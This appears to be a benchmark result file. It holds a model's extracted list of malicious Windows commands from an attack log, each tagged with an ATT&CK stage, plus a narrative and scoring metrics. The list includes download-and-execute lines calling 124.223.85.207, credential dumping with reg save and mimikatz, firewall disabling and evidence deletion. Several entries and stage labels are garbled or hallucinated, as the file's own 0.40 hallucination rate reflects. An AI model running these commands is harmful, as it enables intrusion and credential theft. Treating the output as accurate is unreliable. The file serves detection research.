@@ -1,0 +1,276 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "cmd.exe /c \"certutil.exe /urlcache -split -f https://1russia[.]xyz/browson.dll\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "\\??\\C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sqlldr.exe *",
+        "stage": "Persistence"
+      },
+      {
+        "command": "C:\\Program Files\\WindowsApps\\Microsoft.Photos.MediaEngineDLC_1.0.0.0_x64__8wekyb3d8bbwe\\Photos.DLC.MediaEngine.exe",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\\?.*\\.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Start-Process .\\T1059.003_script.bat\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"invoke-systemmanagement T1036.004 -DetailedInfo -FullDetails\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\4iwlyhn4\\4iwlyhn4.cmdline\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\yajshw1q\\yajshw1q.cmdline\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"invoke-networkdiscovery T1553.002 -Target localhost\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Set-RubeanUACPolicy; Invoke-UACCheck; Invoke-MemoryDump\", \"EnableLocalAdmin; AddCurrentUserToAdministratorsGroup; Get-WinPEB; DisableUserAccountControl; InstallService <<Uninstaller>>; DisableNetworkServices; RunRemoteCommandsViaWinRM; OverrideFileAttributes; ImpersonateAsAdmin; RestoreBootPassword; ClearApplicationCompatibilityFlags; UpgradeOperatingSystem\", \"DisableMemoryProtection, KillProcessesWithHandle; CreateMutexes; OverwriteFilesInDirectories Whether running as SYSTEM\", \"AddGroupMembership <username> Administrators; GetDocumentsOnDesktop ; DownloadUpdatesViaWU AU\u00bb, \"NO\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg.exe add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" /v test /t REG_SZ /d \"C:\\windows\\system32\\calc.exe\" /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "schtasks /create /tn test /tr c:\\test\\1053.005.bat /sc onlogon",
+        "stage": "Persistence"
+      },
+      {
+        "command": "schtasks /delete /tn test /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg.exe SAVE HKEY_LOCAL_MACHINE\\SECURITY c:\\users\\administrator\\appdata\\local\\temp\\tjbvkjpetfjp",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "reg.exe SAVE HKEY_LOCAL_MACHINE\\SAM c:\\users\\administrator\\appdata\\local\\temp\\tthwwf",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "reg.exe SAVE HKEY_LOCAL_MACHINE\\SYSTEM c:\\windows\\temp\\SYSTEM_HIVE",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "del /f /s lsass_dump.dmp",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1003.003\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "net group \"domain admins\" /domain",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119.005 \"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"invoke-webrequest http://124.223.85.207:8082/test.hta -method post\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/test.hta",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"copy-item '.\\msxsl.exe' 'c:\\windows\\temp\\msxsl.exe'",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \".\\chromeremoteservices.ps1\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"start-process $env:temp\\t1059.003_script.bat\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg.exe save hkey_local_machine\\software\\policies\\microsoft\\office\\17.0\\outlook\\trust center h:\\\\workgroup\\\\\\admin\\\\\\laptop\\\\\\\registry\\\\\\save\\\\\\test.reg",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "cmd.exe /C T1059.006.py",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\Desktop\\shell\\T1059.006.py",
+        "stage": "Execution"
+      },
+      {
+        "command": "C:\\Windows\\system32\\cmd.exe /c Netsh Advfirewall show allprofiles &  NetSh Advfirewall?set?allprofiles state off & echo \ufffd\ufffd\ufffd\ufffd\u01fd\ufffd\u0479\u0440\ufffd& pause",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd.exe /C \"certutil.exe -decode a.txt b.txt\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "del /f /q b.txt",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1548.002 -TestNumbers 2\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \\\"application/json\\\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "sangforcat.exe -v -server https://124.223.85.207:8443",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "mimikatz2.exe  lsadump::sam exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "mimikatz.exe  LSADUMP::DCSync exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"mkdir timestomp ; echo ipconfig /all > timestomp/timestomp.txt ; (ls timestomp).LastWriteTime=\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd.exe /C \"mimikatz.exe LSADUMP::LSADump exit\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "cmd.exe /C spolsv.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"[IO.File]::ReadAllBytes('C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\lneiyiqo.dll');[Reflection.Assembly]::Load([IO.File]::ReadAllBytes('C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\lneiyiqo.dll'));[Reflection.Assembly]::LoadFrom('C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\lneiyiqo.dll');$byte[] = new-array([IO.File]::ReadAllBytes('C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\lneiyiqo.dll'));$stream=$byte[];[Console]::SetIn($stream);$Reader=new-object System.IO.StreamReader($stream);$content=$reader.ReadLine();[int]$stream.Position=0;$assem=$null;$mod=$null;if(($stream.Position -eq 0) -and ($content.StartsWith('MZ'))) {\r\n        Write-host 'YES';\r\n        return;\r\n       }\r\n      $read = 1;\r\n     while( $read ){\r\n         try{\r\n             $bytes = [IO.File]::ReadAllBytes(('C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\lneiyiqo.dll'));\r\n             $resource[$bytes.Length]= $bytes;\r\n             } catch {throw};\r\n         $resource += [IO.File]::ReadAllBytes('C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\lneiyiqo.dll');\r\n}\r\n       $size = $resource.Count;\r\n      \r\n     $offset = 0;\r\n         # EXTRACT BYTES FROM RESOURCE\r\n         for ($i=0; $i -lt $size; $i++) {\r\n                 $extract = $false;\r\n                \r\n                  foreach($file in Get-ChildItem 'C:\\\\Users\\\\Administrator\\\\Desktop\\\\shell'){ \r\n                     if ($file.Name -match '^.*\\\\.DLL\\\">$.){ \r\n                          $fname =$file.FullName;\r\n                           \r\n                            $off = 0;\r\n                            \r\n                           \r\n                             if (($file.LastWriteTime.ToString()-eq'Saturday,'October' 10, 2020' 12:12:12 PM') -and\r\n                                ($file.FullName.Contains('T1091.001_executable_code'))){\r\n                                  $execcode = ([IO.File]::ReadAllBytes($fname));\r\n                                 }elseif (\r\n                                    ($file.lastwritetime.tostring()-eq'Sunday, October 11, 2020 12:12:12 AM') -and\r\n                                   ($file.name.contains('T1057.004_domain_name_discovery'))){\r\n                                     $domnames = ([IO.file]::readallbytes($fname));\r\n                                    }\r\n                              }\r\n                       }\r\n                  \r\n               }\r\n           $extract = $true;\r\n         \r\n          if (!$extract){Exit;\r\n                      }\r\n          jquer os [System.Diagnostics.Process]\r\n                        yadgswf diooo r,$ftwres [$size];\r\n            $x = 0;\r\n           $offs = $offset + 0x758;\r\n          \r\n          $count = 0;\r\n         \r\n            \r\n          \r\n                    foreach($file in Get-ChildItem 'C:\\Users\\\\Administrator\\\\Desktop\\\\shell'){\r\n                         \r\n                     if ($file.Name-matches'^.*\\\\.dll>$\r\n                      {\r\n                                        $fname =$file.fullname;\r\n                                       [System.IO.BinaryReader](new-object io.stream reader($fname)).ReadByte();\r\n                                      }\r\n                          \r\n                                        \r\n                              \r\n                             \r\n                            \r\n                           \r\n                        }\r\n                \r\n          # write resource to file\r\n          $path = $PWD.Path+\\\\",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\lneiyiqo.dll",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "del /f /s C:\\\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\lneiyiqo.dll",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \\\"application/json\\\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Remove-Variable lneiyiqo.dll -ErrorAction SilentlyContinue\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "rundll32.exe user32.dll, LockWorkStation",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd.exe /C \"del /f /q lneiyiqo.dll\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "mimikatz2.exe lsadump::sam exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "mimikatz.exe LSADUMP::DCSync exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"[IO.File]::ReadAllBytes('C:\\\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\btrohapy.dll');[Reflection.Assembly]::Load([IO.File]::ReadAllBytes('C:\\\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\btrohapy.dll'));[IO.File]::OpenText('C:\\\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\btrohapy.dll', '[System.IO.FileMode]::Open').Close()",
+        "stage": "Persistence"
+      }
+    ],
+    "narrative": "The attackers established an initial access vector by downloading and executing malware through various means such as PowerShell, batch files, and executable files. They then evaded detection by tampering with system processes and registry keys. The attackers attempted to persist their presence within the system by modifying startup locations and adding scheduled tasks. To escalate privileges, they exploited vulnerabilities in Windows Management Instrumentation (WMI) services and successfully obtained Domain Administrator rights. Additionally, they accessed and stole sensitive information stored on the system, collectings system details, and ultimately achieved command and control over the compromised machine. Through continuous exploitation of weak points, the attackers gained additional privilege escalation, enabling further lateral movement via SangForCat.exe. Furthermore, leveraging power shell commands enabled them to decode Sigma expressions payload delivered via HTTP from IP address 124.223.85.207, demonstrating their ability to maintain persistence despite attempts to remove the malware. Lastly, the attackers utilized Mimikats tools to dump SAM records, allowing them to obtain active directory credentials.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 96074,
+      "completion_tokens": 7718,
+      "total_tokens": 103792,
+      "wall_clock_s": 112.724,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.30357142857142855,
+      "recall": 0.4473684210526316,
+      "f1": 0.36170212765957444,
+      "tp": 17,
+      "fp": 39,
+      "fn": 21
+    },
+    "stage": {
+      "precision": 0.16071428571428573,
+      "recall": 0.23684210526315788,
+      "f1": 0.19148936170212766,
+      "tp": 9,
+      "fp": 47,
+      "fn": 29,
+      "recall_partial": 0.32432432432432434
+    },
+    "hallucination_rate": 0.3953488372093023,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 96074,
+      "completion_tokens": 7718,
+      "total_tokens": 103792,
+      "wall_clock_s": 112.724,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v5_got_links",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": true
+  }
+}
